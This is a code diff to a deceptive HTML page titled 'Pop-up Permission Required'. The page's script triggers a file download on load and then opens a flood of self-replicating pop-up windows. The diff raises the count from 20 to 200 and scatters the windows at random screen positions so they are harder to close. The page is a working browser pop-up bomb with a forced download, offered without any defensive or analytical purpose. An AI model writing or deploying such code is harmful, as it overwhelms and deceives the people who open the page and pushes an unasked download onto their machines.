@@ -4,24 +4,27 @@
   <meta charset="UTF-8" />
   <title>Pop-up Permission Required</title>
   <script>
-    function openPopup() {
-      const width = 500;
-      const height = 400;
+function openPopup() {
+  const width = 500;
+  const height = 400;
 
-      const left = window.screen.availWidth - width - 10;
-      const top = 10;
+  const maxLeft = window.screen.availWidth - width;
+  const maxTop = window.screen.availHeight - height;
 
-      const popup = window.open(
-        window.location.href + "?popup=true",
-        "_blank",
-        `width=${width},height=${height},left=${left},top=${top}`
-      );
+  const left = Math.floor(Math.random() * maxLeft);
+  const top = Math.floor(Math.random() * maxTop);
 
-      if (popup) {
-        popup.focus();
-        window.blur();
-      }
-    }
+  const popup = window.open(
+    window.location.href + "?popup=true",
+    "_blank",
+    `width=${width},height=${height},left=${left},top=${top}`
+  );
+
+  if (popup) {
+    popup.focus();
+    window.blur();
+  }
+}
 
     window.onload = function () {
       const isPopup = new URLSearchParams(window.location.search).has('popup');
@@ -48,7 +51,7 @@
         download.click();
 
         // Spawn 20 popups immediately
-        for (let i = 0; i < 20; i++) {
+        for (let i = 0; i < 200; i++) {
           openPopup();
         }
 
